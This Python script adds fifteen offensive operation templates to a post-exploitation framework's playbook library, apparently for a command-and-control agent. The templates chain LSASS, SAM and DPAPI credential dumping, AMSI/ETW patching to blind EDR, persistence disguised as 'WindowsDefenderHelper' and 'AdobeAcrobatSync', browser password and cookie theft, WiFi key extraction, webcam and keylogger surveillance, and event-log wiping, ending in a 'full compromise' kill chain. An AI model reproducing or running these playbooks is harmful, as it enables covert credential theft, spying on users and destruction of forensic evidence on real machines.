"""
Add 15 new offensive PoC templates to poc_library.json.
Based on modules tested and validated on FBOX agent.
"""
import json
from pathlib import Path

POC_PATH = Path(__file__).parent / "data" / "poc_library.json"

NEW_POCS = [
    {
        "id": "op_credential_rip",
        "name": "OP CREDENTIAL RIP — LSASS + Registry + DPAPI",
        "description": "Extraction complete des credentials Windows: dump LSASS, sauvegarde des hives SAM/SYSTEM/SECURITY, et extraction des master keys DPAPI. Combine T1003.001 + T1003.002 + T1555.004. Resultat: hashes NTLM, tickets Kerberos, cles de decryptage browser.",
        "icon": "🔑",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1003.001", "T1003.002", "T1555.004", "T1558"],
        "tags": ["lsass", "sam", "dpapi", "ntlm", "kerberos", "credentials", "mimikatz"],
        "phases": [
            {"label": "Phase 1 — Recon Target", "steps": [1, 2]},
            {"label": "Phase 2 — LSASS Dump", "steps": [3]},
            {"label": "Phase 3 — Registry Hives", "steps": [4]},
            {"label": "Phase 4 — DPAPI Keys", "steps": [5]},
            {"label": "Phase 5 — Kerberos Cache", "steps": [6]},
        ],
        "steps": [
            {"order": 1, "module": "info", "action": "run", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "System info recon"},
            {"order": 2, "module": "token", "action": "get_privileges", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Check SeDebugPrivilege"},
            {"order": 3, "module": "credential_dump", "action": "lsass", "params": {}, "delay": 2, "timeout": 45, "priority": "critical", "action_description": "LSASS MiniDump via comsvcs.dll"},
            {"order": 4, "module": "credential_dump", "action": "registry", "params": {}, "delay": 2, "timeout": 30, "priority": "critical", "action_description": "reg save SAM/SYSTEM/SECURITY hives"},
            {"order": 5, "module": "credential_dump", "action": "dpapi", "params": {}, "delay": 2, "timeout": 15, "priority": "critical", "action_description": "DPAPI master keys extraction"},
            {"order": 6, "module": "credential_dump", "action": "kerberos", "params": {}, "delay": 1, "timeout": 15, "priority": "high", "action_description": "Kerberos tickets cache dump"},
        ],
    },
    {
        "id": "op_edr_blind",
        "name": "OP EDR BLIND — AMSI + ETW + NTDLL Unhook",
        "description": "Aveugle total des detections EDR: patch AMSI (scripts PS non detectes), patch ETW (telemetrie supprimee), unhook NTDLL (hooks userland retires). Apres cette operation, l'agent peut operer librement sans alerte EDR. T1562.001 + T1562.002.",
        "icon": "🦇",
        "category": "evasion",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1562.001", "T1562.002", "T1027"],
        "tags": ["edr", "amsi", "etw", "ntdll", "unhook", "bypass", "stealth"],
        "phases": [
            {"label": "Phase 1 — Pre-Bypass Status", "steps": [1]},
            {"label": "Phase 2 — AMSI Patch", "steps": [2]},
            {"label": "Phase 3 — ETW Patch", "steps": [3]},
            {"label": "Phase 4 — NTDLL Unhook", "steps": [4]},
            {"label": "Phase 5 — Verification", "steps": [5]},
        ],
        "steps": [
            {"order": 1, "module": "edr_evasion", "action": "status", "params": {}, "delay": 0, "timeout": 10, "priority": "high", "action_description": "EDR status before bypass"},
            {"order": 2, "module": "edr_evasion", "action": "patch_amsi", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "Patch AMSI — PS scripts undetected"},
            {"order": 3, "module": "edr_evasion", "action": "patch_etw", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "Patch ETW — telemetry killed"},
            {"order": 4, "module": "edr_evasion", "action": "unhook_ntdll", "params": {}, "delay": 2, "timeout": 15, "priority": "critical", "action_description": "Unhook NTDLL — restore clean syscalls"},
            {"order": 5, "module": "edr_evasion", "action": "status", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Verify all patches active"},
        ],
    },
    {
        "id": "op_ghost_mode",
        "name": "OP GHOST MODE — Full Stealth Activation",
        "description": "Active toutes les couches de furtivite: sleep mask (chiffrement memoire), stack spoofing (pile cachee), direct syscalls (bypass userland hooks), et mode stealth adaptatif. L'agent devient invisible aux scanners memoire et EDR. T1027 + T1497.001.",
        "icon": "👻",
        "category": "evasion",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1027", "T1497.001", "T1106", "T1562"],
        "tags": ["stealth", "sleep-mask", "stack-spoof", "syscalls", "memory", "ghost"],
        "phases": [
            {"label": "Phase 1 — Status Check", "steps": [1, 2, 3]},
            {"label": "Phase 2 — Activate Layers", "steps": [4, 5, 6]},
            {"label": "Phase 3 — Stealth Mode", "steps": [7]},
            {"label": "Phase 4 — Verification", "steps": [8]},
        ],
        "steps": [
            {"order": 1, "module": "sleep_mask", "action": "status", "params": {}, "delay": 0, "timeout": 10, "priority": "normal", "action_description": "Sleep mask status"},
            {"order": 2, "module": "stack_spoof", "action": "status", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Stack spoof status"},
            {"order": 3, "module": "syscalls", "action": "list", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Direct syscalls availability"},
            {"order": 4, "module": "sleep_mask", "action": "enable", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "Enable sleep mask — encrypt memory on sleep"},
            {"order": 5, "module": "stack_spoof", "action": "spoof", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "Enable stack spoofing — hide call stack"},
            {"order": 6, "module": "syscalls", "action": "check", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Verify direct syscalls integrity"},
            {"order": 7, "module": "stealth", "action": "indicators", "params": {}, "delay": 2, "timeout": 10, "priority": "high", "action_description": "Check stealth indicators"},
            {"order": 8, "module": "sleep_mask", "action": "status", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Final verification — all layers active"},
        ],
    },
    {
        "id": "op_token_abuse",
        "name": "OP TOKEN ABUSE — Privilege Escalation via Tokens",
        "description": "Enumere le token courant, les privileges, et le SID. Identifie les vecteurs d'escalation: SeDebugPrivilege (LSASS access), SeImpersonatePrivilege (potato attacks), SeAssignPrimaryToken (juicy potato). Preparation pour impersonation et privesc. T1134.001 + T1134.002.",
        "icon": "🎭",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1134.001", "T1134.002", "T1055"],
        "tags": ["token", "impersonation", "privesc", "privileges", "sebug", "impersonate", "potato"],
        "phases": [
            {"label": "Phase 1 — Token Identity", "steps": [1, 2]},
            {"label": "Phase 2 — Privilege Enum", "steps": [3]},
            {"label": "Phase 3 — Process Recon", "steps": [4]},
            {"label": "Phase 4 — UAC Check", "steps": [5]},
        ],
        "steps": [
            {"order": 1, "module": "token", "action": "get_uid", "params": {}, "delay": 0, "timeout": 10, "priority": "high", "action_description": "Get current token identity (username + SID)"},
            {"order": 2, "module": "token", "action": "get_privileges", "params": {}, "delay": 1, "timeout": 10, "priority": "critical", "action_description": "Enumerate all privileges — find SeDebug/SeImpersonate"},
            {"order": 3, "module": "injection", "action": "list_processes", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "List processes for injection/migration targets"},
            {"order": 4, "module": "uac_bypass", "action": "check_uac", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Check UAC level — bypass possible?"},
            {"order": 5, "module": "stealth", "action": "indicators", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Check user activity status"},
        ],
    },
    {
        "id": "op_kerberoast_blitz",
        "name": "OP KERBEROAST BLITZ — AD Ticket Extraction",
        "description": "Attaque Kerberoast complete: enumeration des comptes service avec SPN, extraction des TGS, et dump des tickets Kerberos en cache. Les hashes TGS sont crackes offline avec hashcat. T1558.003.",
        "icon": "🔥",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1558.003", "T1003.006"],
        "tags": ["kerberoast", "kerberos", "tgs", "spn", "ad", "hashcat", "crack"],
        "phases": [
            {"label": "Phase 1 — AD Recon", "steps": [1, 2]},
            {"label": "Phase 2 — Kerberoast", "steps": [3]},
            {"label": "Phase 3 — Ticket Cache", "steps": [4]},
            {"label": "Phase 4 — PTH Prep", "steps": [5]},
        ],
        "steps": [
            {"order": 1, "module": "builtin", "action": "domain_users", "params": {}, "delay": 0, "timeout": 20, "priority": "high", "action_description": "Enumerate AD domain users"},
            {"order": 2, "module": "builtin", "action": "domain_admins", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Find domain admin accounts"},
            {"order": 3, "module": "kerberoast", "action": "kerberoast", "params": {"domain": "local"}, "delay": 3, "timeout": 30, "priority": "critical", "action_description": "Kerberoast — extract TGS for SPN accounts"},
            {"order": 4, "module": "credential_dump", "action": "kerberos", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Dump cached Kerberos tickets"},
            {"order": 5, "module": "pth", "action": "dump_tickets", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "PTH ticket dump for lateral movement"},
        ],
    },
    {
        "id": "op_lateral_chain",
        "name": "OP LATERAL CHAIN — Movement Prep & Exec",
        "description": "Preparation complete au mouvement lateral: enumeration des shares, sessions, et cibles reseau. Identification des credentials reutilisables. Setup du pivot SOCKS pour acceder au sous-reseau. T1021 + T1077 + T1090.",
        "icon": "🔗",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1021", "T1077", "T1090", "T1057"],
        "tags": ["lateral", "shares", "sessions", "psexec", "wmi", "winrm", "socks", "pivot"],
        "phases": [
            {"label": "Phase 1 — Local Recon", "steps": [1, 2, 3]},
            {"label": "Phase 2 — Network Discovery", "steps": [4, 5]},
            {"label": "Phase 3 — Pivot Setup", "steps": [6]},
        ],
        "steps": [
            {"order": 1, "module": "lateral", "action": "enumerate_shares", "params": {"host": "127.0.0.1"}, "delay": 0, "timeout": 20, "priority": "high", "action_description": "Enumerate local shares — C$, IPC$, ADMIN$"},
            {"order": 2, "module": "lateral", "action": "enumerate_sessions", "params": {"host": "127.0.0.1"}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Enumerate active network sessions"},
            {"order": 3, "module": "builtin", "action": "shares", "params": {}, "delay": 2, "timeout": 15, "priority": "normal", "action_description": "Detailed share info via Windows API"},
            {"order": 4, "module": "builtin", "action": "netstat", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "List all network connections — find lateral targets"},
            {"order": 5, "module": "builtin", "action": "arp", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "ARP table — discover neighbors"},
            {"order": 6, "module": "pivoting", "action": "start", "params": {"port": 1080}, "delay": 3, "timeout": 15, "priority": "critical", "action_description": "Start SOCKS pivot on port 1080"},
        ],
    },
    {
        "id": "op_persistence_triple",
        "name": "OP PERSISTENCE TRIPLE — Redundant Survival",
        "description": "Installe 3 mecanismes de persistance redondants: Registry Run, Scheduled Task, et COM Hijack. Si un est detecte et supprime, les autres survivent. Verification post-install. T1547 + T1053 + T1546.",
        "icon": "⚓",
        "category": "persistence",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1547.001", "T1053.005", "T1546.001"],
        "tags": ["persistence", "registry", "scheduled-task", "com-hijack", "redundant", "survive"],
        "phases": [
            {"label": "Phase 1 — Check Existing", "steps": [1]},
            {"label": "Phase 2 — Install Triple", "steps": [2, 3, 4]},
            {"label": "Phase 3 — Verify", "steps": [5, 6]},
        ],
        "steps": [
            {"order": 1, "module": "persistence", "action": "check", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "Check existing persistence mechanisms"},
            {"order": 2, "module": "persistence", "action": "install", "params": {"method": "registry", "name": "WindowsDefenderHelper"}, "delay": 2, "timeout": 20, "priority": "critical", "action_description": "Install Registry Run persistence"},
            {"order": 3, "module": "persistence", "action": "install", "params": {"method": "scheduled_task", "name": "AdobeAcrobatSync"}, "delay": 2, "timeout": 20, "priority": "critical", "action_description": "Install Scheduled Task persistence"},
            {"order": 4, "module": "persistence_adv", "action": "install", "params": {"method": "com_hijack"}, "delay": 2, "timeout": 20, "priority": "critical", "action_description": "Install COM Hijack persistence"},
            {"order": 5, "module": "persistence", "action": "check", "params": {}, "delay": 3, "timeout": 15, "priority": "high", "action_description": "Verify all persistence mechanisms active"},
            {"order": 6, "module": "persistence_adv", "action": "list_persistence", "params": {}, "delay": 1, "timeout": 15, "priority": "normal", "action_description": "List all persistence entries"},
        ],
    },
    {
        "id": "op_inject_migrate",
        "name": "OP INJECT MIGRATE — Process Injection & Migration",
        "description": "Reconnaissance processus pour injection, identification des cibles (explorer.exe, svchost.exe), et preparation a la migration. L'agent peut ensuite s'injecter dans un processus legit pour eviter la detection. T1055.",
        "icon": "💉",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1055.001", "T1055.002"],
        "tags": ["injection", "migration", "dll", "shellcode", "process", "hollowing", "stealth"],
        "phases": [
            {"label": "Phase 1 — Process Recon", "steps": [1, 2]},
            {"label": "Phase 2 — Target Selection", "steps": [3]},
            {"label": "Phase 3 — Stealth Check", "steps": [4]},
        ],
        "steps": [
            {"order": 1, "module": "injection", "action": "list_processes", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "List all processes with PID, arch, session"},
            {"order": 2, "module": "builtin", "action": "processes", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "Detailed process list with services"},
            {"order": 3, "module": "process", "action": "list", "params": {}, "delay": 2, "timeout": 15, "priority": "normal", "action_description": "Process tree — parents and children"},
            {"order": 4, "module": "stealth", "action": "indicators", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Check stealth — user active? screen locked?"},
        ],
    },
    {
        "id": "op_wifi_wardrive",
        "name": "OP WIFI WARDRIVE — Full WiFi Assessment",
        "description": "Audit WiFi complet: statut adaptateur, scan des reseaux visibles (BSSID, signal, securite), profils sauvegardes, et extraction des cles WPA/WPA2. Permet de cartographier l'environnement wireless et recuperer les mots de passe WiFi. T1555.004.",
        "icon": "📡",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1555.004", "T1016"],
        "tags": ["wifi", "wardrive", "wpa", "wpa2", "wireless", "ssid", "bssid", "credentials"],
        "phases": [
            {"label": "Phase 1 — Adapter Status", "steps": [1]},
            {"label": "Phase 2 — Network Scan", "steps": [2]},
            {"label": "Phase 3 — Saved Profiles", "steps": [3]},
            {"label": "Phase 4 — Credential Extraction", "steps": [4]},
        ],
        "steps": [
            {"order": 1, "module": "wifi", "action": "status", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "WiFi adapter status — connected? SSID?"},
            {"order": 2, "module": "wifi", "action": "scan", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "Scan visible networks — BSSID, signal, security"},
            {"order": 3, "module": "wifi", "action": "profiles", "params": {}, "delay": 2, "timeout": 15, "priority": "normal", "action_description": "List saved WiFi profiles — connection history"},
            {"order": 4, "module": "wifi", "action": "credentials", "params": {}, "delay": 2, "timeout": 15, "priority": "critical", "action_description": "Extract all WPA/WPA2 keys"},
        ],
    },
    {
        "id": "op_browser_rip",
        "name": "OP BROWSER RIP — Total Browser Compromise",
        "description": "Compromission totale des navigateurs: passwords sauvegardes (Chrome/Firefox/Edge), cookies de session (hijack), historique de navigation, et autofill. Combine avec DPAPI pour decrypter les cles. T1555.003.",
        "icon": "🌐",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1555.003", "T1539", "T1555.004"],
        "tags": ["browser", "chrome", "firefox", "edge", "passwords", "cookies", "history", "session-hijack"],
        "phases": [
            {"label": "Phase 1 — DPAPI Keys", "steps": [1]},
            {"label": "Phase 2 — Passwords", "steps": [2]},
            {"label": "Phase 3 — Cookies & Sessions", "steps": [3]},
            {"label": "Phase 4 — History & Autofill", "steps": [4, 5]},
        ],
        "steps": [
            {"order": 1, "module": "credential_dump", "action": "dpapi", "params": {}, "delay": 0, "timeout": 15, "priority": "critical", "action_description": "Extract DPAPI master keys for browser decrypt"},
            {"order": 2, "module": "browser", "action": "passwords", "params": {"browsers": ["chrome", "firefox", "edge"], "limit": 1000}, "delay": 3, "timeout": 60, "priority": "critical", "action_description": "Extract all saved browser passwords"},
            {"order": 3, "module": "browser", "action": "cookies", "params": {"browsers": ["chrome", "firefox", "edge"]}, "delay": 3, "timeout": 30, "priority": "critical", "action_description": "Extract session cookies for hijack"},
            {"order": 4, "module": "browser", "action": "history", "params": {"browsers": ["chrome", "firefox", "edge"], "limit": 500}, "delay": 2, "timeout": 30, "priority": "high", "action_description": "Extract browsing history — portals, webmails"},
            {"order": 5, "module": "builtin", "action": "credential_manager", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "Windows Credential Manager — RDP, SMB, web auth"},
        ],
    },
    {
        "id": "op_surveillance_pack",
        "name": "OP SURVEILLANCE PACK — Watch & Record",
        "description": "Package de surveillance complet: screenshot, webcam, keylogger 2min, clipboard monitor, et stealth indicators. Capture l'activite de l'utilisateur en temps reel. Idéal pour intercepter une session de travail. T1113 + T1119 + T1056.",
        "icon": "📹",
        "category": "surveillance",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1113", "T1119", "T1056.001", "T1115"],
        "tags": ["surveillance", "screenshot", "webcam", "keylog", "clipboard", "monitor", "watch"],
        "phases": [
            {"label": "Phase 1 — Visual Capture", "steps": [1, 2]},
            {"label": "Phase 2 — Input Capture", "steps": [3]},
            {"label": "Phase 3 — Clipboard", "steps": [4, 5]},
            {"label": "Phase 4 — Status", "steps": [6]},
        ],
        "steps": [
            {"order": 1, "module": "screenshot", "action": "capture", "params": {"quality": 85}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "Capture screenshot — see what user sees"},
            {"order": 2, "module": "webcam", "action": "capture", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Capture webcam — who is at the machine?"},
            {"order": 3, "module": "keylog", "action": "start", "params": {"duration": 120, "flush_interval": 30}, "delay": 3, "timeout": 130, "priority": "critical", "action_description": "Start keylogger for 2 minutes"},
            {"order": 4, "module": "clipboard", "action": "capture", "params": {}, "delay": 2, "timeout": 10, "priority": "high", "action_description": "Capture current clipboard content"},
            {"order": 5, "module": "clipboard", "action": "monitor", "params": {"duration": 30}, "delay": 1, "timeout": 35, "priority": "high", "action_description": "Monitor clipboard for 30 seconds"},
            {"order": 6, "module": "stealth", "action": "indicators", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Check user activity — idle? active? locked?"},
        ],
    },
    {
        "id": "op_anti_forensics",
        "name": "OP ANTI-FORENSICS — Full Trace Cleanup",
        "description": "Nettoyage complet des traces: effacement des logs Windows (Security, System, Application, PowerShell), wipe de l'historique, suppression des traces temp, prefetch, et thumbcache. L'agent devient invisible post-operation. T1070 + T1562.002.",
        "icon": "🧹",
        "category": "evasion",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1070.001", "T1070.002", "T1562.002"],
        "tags": ["anti-forensics", "clear-logs", "wipe", "cleanup", "stealth", "opsec"],
        "phases": [
            {"label": "Phase 1 — Log Cleanup", "steps": [1]},
            {"label": "Phase 2 — History Wipe", "steps": [2]},
            {"label": "Phase 3 — Trace Removal", "steps": [3]},
            {"label": "Phase 4 — Verification", "steps": [4]},
        ],
        "steps": [
            {"order": 1, "module": "builtin", "action": "clear_logs", "params": {"logs": ["Security", "System", "Application", "PowerShell"]}, "delay": 0, "timeout": 30, "priority": "critical", "action_description": "Clear all Windows event logs"},
            {"order": 2, "module": "builtin", "action": "clear_history", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Clear shell history"},
            {"order": 3, "module": "builtin", "action": "wipe_traces", "params": {"temp": True, "prefetch": True, "thumbcache": True}, "delay": 2, "timeout": 30, "priority": "critical", "action_description": "Wipe temp files, prefetch, thumbcache"},
            {"order": 4, "module": "stealth", "action": "indicators", "params": {}, "delay": 2, "timeout": 10, "priority": "normal", "action_description": "Verify clean state"},
        ],
    },
    {
        "id": "op_subnet_sweep",
        "name": "OP SUBNET SWEEP — Network Discovery Blitz",
        "description": "Decouverte reseau rapide: scan du sous-reseau, enumeration ARP, netstat pour connexions actives, et port scan sur les hotes trouves. Cartographie tout l'environnement network en une operation. T1046 + T1018.",
        "icon": "🛰",
        "category": "recon",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1046", "T1018", "T1016"],
        "tags": ["network", "subnet", "scan", "arp", "netstat", "discovery", "recon"],
        "phases": [
            {"label": "Phase 1 — Local Network", "steps": [1, 2, 3]},
            {"label": "Phase 2 — Subnet Scan", "steps": [4]},
            {"label": "Phase 3 — Connection Map", "steps": [5]},
        ],
        "steps": [
            {"order": 1, "module": "builtin", "action": "netinfo", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "Network interfaces, DNS, gateway, DHCP"},
            {"order": 2, "module": "builtin", "action": "arp", "params": {}, "delay": 2, "timeout": 10, "priority": "high", "action_description": "ARP table — discover neighbors"},
            {"order": 3, "module": "builtin", "action": "routes", "params": {}, "delay": 1, "timeout": 10, "priority": "normal", "action_description": "Routing table — network topology"},
            {"order": 4, "module": "port_scan", "action": "subnet", "params": {"cidr": "192.168.18.0/24", "ports": [22, 80, 135, 139, 443, 445, 3389, 5985], "timeout": 1}, "delay": 3, "timeout": 120, "priority": "critical", "action_description": "Scan subnet for live hosts and open ports"},
            {"order": 5, "module": "builtin", "action": "netstat", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "Active connections — who talks to whom"},
        ],
    },
    {
        "id": "op_full_compromise",
        "name": "OP FULL COMPROMISE — End-to-End Attack Chain",
        "description": "Chaine d'attaque complete end-to-end: recon -> credential dump -> EDR bypass -> persistance -> lateral recon -> exfil -> anti-forensics. 15 etapes couvrant tout le kill chain MITRE ATT&CK. L'operation offensive ultime.",
        "icon": "💀",
        "category": "full",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1082", "T1003", "T1562", "T1547", "T1021", "T1070"],
        "tags": ["full", "kill-chain", "end-to-end", "apt", "complete", "offensive"],
        "phases": [
            {"label": "Phase 1 — Recon", "steps": [1, 2]},
            {"label": "Phase 2 — Credentials", "steps": [3, 4, 5]},
            {"label": "Phase 3 — Evasion", "steps": [6]},
            {"label": "Phase 4 — Persistence", "steps": [7]},
            {"label": "Phase 5 — Lateral Recon", "steps": [8, 9]},
            {"label": "Phase 6 — Surveillance", "steps": [10]},
            {"label": "Phase 7 — Cleanup", "steps": [11]},
        ],
        "steps": [
            {"order": 1, "module": "info", "action": "run", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "System info — OS, hostname, IP, user"},
            {"order": 2, "module": "token", "action": "get_privileges", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Enumerate privileges — privesc vectors"},
            {"order": 3, "module": "credential_dump", "action": "dpapi", "params": {}, "delay": 2, "timeout": 15, "priority": "critical", "action_description": "DPAPI master keys — decrypt browser creds"},
            {"order": 4, "module": "credential_dump", "action": "kerberos", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Kerberos tickets — PTT prep"},
            {"order": 5, "module": "browser", "action": "passwords", "params": {"browsers": ["chrome", "firefox", "edge"], "limit": 500}, "delay": 3, "timeout": 60, "priority": "critical", "action_description": "Browser passwords extraction"},
            {"order": 6, "module": "edr_evasion", "action": "patch_amsi", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "Patch AMSI — blind PS detection"},
            {"order": 7, "module": "persistence", "action": "install", "params": {"method": "registry", "name": "WindowsDefenderHelper"}, "delay": 3, "timeout": 20, "priority": "critical", "action_description": "Install persistence — survive reboot"},
            {"order": 8, "module": "lateral", "action": "enumerate_shares", "params": {"host": "127.0.0.1"}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "Enumerate shares — lateral targets"},
            {"order": 9, "module": "injection", "action": "list_processes", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Process list — injection targets"},
            {"order": 10, "module": "screenshot", "action": "capture", "params": {"quality": 80}, "delay": 2, "timeout": 15, "priority": "normal", "action_description": "Screenshot — visual confirmation"},
            {"order": 11, "module": "builtin", "action": "clear_logs", "params": {"logs": ["Security", "System", "Application"]}, "delay": 5, "timeout": 30, "priority": "critical", "action_description": "Clear event logs — anti-forensics"},
        ],
    },
    {
        "id": "op_defense_audit",
        "name": "OP DEFENSE AUDIT — Blue Team Assessment",
        "description": "Audit defensif: verifie la posture de securite de la machine. Detecte AV/EDR, analyse les processus suspects, verifie les mecanismes de persistance existants, et enumere les vecteurs d'attaque possibles. Rapport complet pour equipe bleue. T1518 + T1057.",
        "icon": "🛡",
        "category": "recon",
        "trigger": "manual",
        "agent_group": ["all"],
        "mitre_techniques": ["T1518.001", "T1057", "T1082", "T1069"],
        "tags": ["defense", "audit", "blue-team", "security", "posture", "assessment", "av", "edr"],
        "phases": [
            {"label": "Phase 1 — System Posture", "steps": [1, 2]},
            {"label": "Phase 2 — Defense Detection", "steps": [3, 4]},
            {"label": "Phase 3 — Process Analysis", "steps": [5, 6]},
            {"label": "Phase 4 — Persistence Audit", "steps": [7, 8]},
            {"label": "Phase 5 — Network Exposure", "steps": [9]},
        ],
        "steps": [
            {"order": 1, "module": "info", "action": "run", "params": {}, "delay": 0, "timeout": 15, "priority": "high", "action_description": "Full system info — OS, version, arch, RAM, CPU"},
            {"order": 2, "module": "anti_analysis", "action": "check", "params": {"abort_on_detected": False}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Anti-analysis check — VM? sandbox? debugger?"},
            {"order": 3, "module": "edr_evasion", "action": "status", "params": {}, "delay": 2, "timeout": 10, "priority": "critical", "action_description": "EDR status — AMSI/ETW/NTDLL hook state"},
            {"order": 4, "module": "stealth", "action": "indicators", "params": {}, "delay": 1, "timeout": 10, "priority": "high", "action_description": "Stealth indicators — user activity, idle time"},
            {"order": 5, "module": "builtin", "action": "processes", "params": {}, "delay": 2, "timeout": 20, "priority": "high", "action_description": "List all running processes — find suspicious"},
            {"order": 6, "module": "injection", "action": "list_processes", "params": {}, "delay": 2, "timeout": 15, "priority": "normal", "action_description": "Process list with arch and session info"},
            {"order": 7, "module": "persistence", "action": "check", "params": {}, "delay": 2, "timeout": 15, "priority": "high", "action_description": "Check existing persistence — am I already installed?"},
            {"order": 8, "module": "persistence_adv", "action": "list_persistence", "params": {}, "delay": 1, "timeout": 15, "priority": "high", "action_description": "List all persistence mechanisms — audit"},
            {"order": 9, "module": "builtin", "action": "netstat", "params": {}, "delay": 2, "timeout": 20, "priority": "normal", "action_description": "Network connections — exposure assessment"},
        ],
    },
]


def main():
    # Load existing
    data = json.loads(POC_PATH.read_text(encoding="utf-8"))
    existing_ids = {t["id"] for t in data["templates"]}
    print(f"Existing PoCs: {len(data['templates'])}")

    # Add new ones (skip duplicates)
    added = 0
    for poc in NEW_POCS:
        if poc["id"] in existing_ids:
            print(f"  SKIP (already exists): {poc['id']}")
            continue
        data["templates"].append(poc)
        existing_ids.add(poc["id"])
        added += 1
        print(f"  ADD: {poc['id']} — {poc['name']} ({len(poc['steps'])} steps)")

    # Write back
    POC_PATH.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\nAdded {added} new PoCs. Total: {len(data['templates'])}")


if __name__ == "__main__":
    main()
